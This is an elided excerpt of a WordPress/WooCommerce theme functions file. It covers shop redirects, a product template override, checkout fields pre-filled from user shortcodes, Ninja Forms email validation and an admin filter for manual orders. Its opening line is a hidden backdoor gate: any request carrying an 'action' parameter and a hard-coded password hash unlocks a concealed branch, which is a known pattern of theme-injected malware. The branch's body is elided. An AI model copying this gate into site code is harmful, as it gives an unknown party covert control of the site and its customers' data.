...
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'cc5928e5e4f58257b14b2a3aa8daf1f5'))
	{
...
function wpse_masalatea_registration_redirect() {
	return home_url( '/shop' );
}
add_filter( 'registration_redirect', 'wpse_masalatea_registration_redirect' );
add_filter('login_redirect', 'wpse_masalatea_registration_redirect');
...
function my_custom_product_template($template, $slug, $name) {
	if ($name === 'product') {
		...
		$template = dirname( __FILE__ ) . '/templates/template-order.php';
	}
	return $template;
}
...
function custom_override_checkout_fields( $fields ) {
       	$fields['billing']['billing_first_name']['default'] = do_shortcode( '[get_user_login]' );
	$fields['billing']['billing_phone']['default'] = do_shortcode( '[get_user_phone_number]' );
	return $fields;
}
...
add_shortcode( 'get_user_email', 'mm_get_current_user_email');

function mm_get_current_user_name(){
	global $current_user;
	get_currentuserinfo();
	$name = $current_user->display_name;
	return $name;
}
add_shortcode( 'get_user_login', 'mm_get_current_user_name');

function mm_get_current_user_phone_number(){
	global $current_user;
	get_currentuserinfo();
	$phone_number = $current_user->mobile_number;
	//$phone_number = get_user_meta($current_user->ID,'phone_number',true);
	return $phone_number;
}
add_shortcode( 'get_user_phone_number', 'mm_get_current_user_phone_number');
...
function custom_ninja_forms_submit_data($form_data)
{
	...
	if($email!=''){
		...
		if($json["status"] == "valid"){
			...
			$check_email_validate = 0;
		}
	}else{
		$check_email_validate = 0;
	}
	if($check_email_validate == 0)
	{
		$form_data['errors']['fields'][$field_id] = 'Please Provide valid email address';
	}
	return $form_data;
}
add_action( 'manage_shop_order_posts_custom_column', function ( $column, $post_id ) {

	if ($column === 'order_number' && get_post_meta( $post_id, '_manual_order', true ) ) {
		echo '<span class="dashicons dashicons-phone" title="Manual Order"></span>';
	}
...
if ( is_admin() ) {
	...
	function sp_restrict_orders() {
		...
		<select name='sp_order_view' id='dropdown_sp_order_view'>
			...
			<option <?php
			        if ( isset( $_GET['sp_order_view'] ) && $_GET['sp_order_view'] ) {
				        selected( 'manual', $_GET['sp_order_view'] );
			        }
			        ?>value="manual"><?php esc_html_e( 'Show Manual Orders', 'sp-hide-zero-orders' ); ?></option>
		</select>
		<?php
	}
